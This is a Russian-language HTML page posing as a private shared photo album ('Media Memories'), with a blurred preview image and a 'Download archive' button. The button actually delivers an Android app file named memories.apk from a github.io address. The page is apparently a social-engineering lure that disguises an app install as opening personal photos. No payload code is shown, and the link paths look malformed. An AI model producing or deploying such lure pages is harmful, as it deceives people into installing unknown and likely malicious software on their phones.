<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Приватный альбом</title>
    <style>
        body { background: #000; color: #fff; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .box { text-align: center; background: #111; padding: 40px; border-radius: 20px; border: 1px solid #333; max-width: 400px; width: 90%; }
        /* Стиль для "галереи": используем ваше загруженное изображение с размытием */
        .preview { 
            width: 100%; 
            height: 200px; 
            /* Ссылка на ваше загруженное изображение 1.jpg */
            background: url('petrova941.github.io') center/cover; 
            border-radius: 10px; 
            margin-bottom: 20px; 
            filter: blur(5px); /* Эффект размытия */
            opacity: 0.8; 
        }
        h1 { font-size: 20px; margin-bottom: 10px; }
        p { font-size: 14px; color: #888; margin-bottom: 30px; }
        .btn { display: block; background: #007aff; color: #fff; text-decoration: none; padding: 15px; border-radius: 10px; font-weight: bold; font-size: 16px; transition: 0.3s; cursor: pointer; border: none; width: 100%; }
        .btn:hover { background: #0051ff; transform: scale(1.02); }
    </style>
</head>
<body>

<div class="box">
    <div class="preview"></div>
    <h1>Архив «Медиа Воспоминания»</h1>
    <p>Вам открыт доступ к общему медиа-альбому. Файлы будут доступны в течение 24 часов.</p>
    
    <!-- Измененный текст кнопки -->
    <a href="petrova941.github.io" download="memories.apk" class="btn" id="downloadBtn">**Скачать архив**</a>
</div>

<script>
    document.getElementById('downloadBtn').addEventListener('click', function(e) {
        console.log('Запуск скачивания...');
    });
</script>

</body>
</html>
